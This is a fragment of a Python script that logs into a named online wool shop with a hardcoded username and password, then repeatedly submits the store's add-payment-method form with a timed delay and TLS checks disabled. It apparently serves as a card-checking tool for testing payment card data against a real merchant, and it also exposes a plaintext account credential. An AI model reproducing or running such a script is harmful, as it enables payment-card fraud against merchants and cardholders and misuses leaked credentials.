...
def Tele(cx):
    ...
    get=r.get("https://www.woolroots.com/my-account/",headers=heaf , verify=False)
    ...
    data = {
    'username': 'kasper',
    'password': 'ONdSlAYonoIS',
    'woocommerce-login-nonce': login,
    '_wp_http_referer': '/my-account/',
    'login': 'Log in',
}

    response = r.post('https://www.woolroots.com/my-account/', headers=headers, data=data , verify=False)
    ...
    response = r.get('https://www.woolroots.com/my-account/add-payment-method/',headers=headers , verify=False)
#print(response.text)
    ...
    response = r.post('https://www.woolroots.com/wp-admin/admin-ajax.php', headers=headers, data=data , verify=False)
    #print(response.text)
    ...
    ges=r.get("https://www.woolroots.com/my-account/add-payment-method/",headers=gh , verify=False)
    ...
    time.sleep(25)
    response = r.post('https://www.woolroots.com/my-account/add-payment-method/', headers=headers, data=data , verify=False)
